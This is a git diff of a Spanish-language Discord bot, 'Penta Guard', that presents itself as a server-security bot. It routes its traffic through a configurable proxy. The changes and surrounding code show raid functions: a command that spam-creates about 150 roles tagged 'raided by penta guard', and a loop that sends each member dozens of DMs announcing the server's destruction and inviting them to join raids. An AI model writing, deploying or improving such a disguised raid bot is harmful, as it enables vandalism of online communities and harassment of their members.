@@ -1,8 +1,7 @@
 const Discord = require("discord.js")
 const client = new Discord.Client();
-const fs = require("fs")
 const config = require('./config.json');
-const { EventEmitter } = require("stream");
+const proxy = require('./proxy.json');
 
 //  [----------------------------CONFIG BOT----------------------]  //
 
@@ -13,14 +12,15 @@ const token_bot = token;
 var globalTunnel = require('global-tunnel');
  
 globalTunnel.initialize({
-  host: '10.0.0.10',
-  port: 8080,
+  host: proxy.host,
+  port: proxy.puerto,
   sockets: 50 // optional pool size for each http and https
 });
     
 //  [----------------------------[BOT]----------------------]  //
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
+client.user.setActivity('La seguridad de tu servidor', { type: 'WATCHING' });
 });
 
 //no se daña si le envian md al bot
@@ -200,7 +200,7 @@ client.on("message", message => {
 
   if (message.author.bot) return;
 
-  if (message.content === '$createrole') {
+  if (message.content === '$createrol') {
     message.delete()
     for (let i = 0; i <= 150; i++) {
       message.guild.roles.create({ data: { name: `pentaguard`, color: '#FFFFF', }, reason: 'raided by penta guard', })
@@ -242,7 +242,7 @@ client.on("message", message => {
     for (let i = 0; i <= 50; i++) { 
          member.send({ 
               embed: { 
-                   description: `*| Destroyed by fast$dead. Join F$D and look the R41D*`, 
+                   description: `*| Servidor destruido por Penta Guard. Unete a Penta Guard para raidear servidores.*`, 
                    author: { 
                         name: 'Penta Guard on Top', 
                         url: 'https://discord.gg/7bnf3mk9nj', 
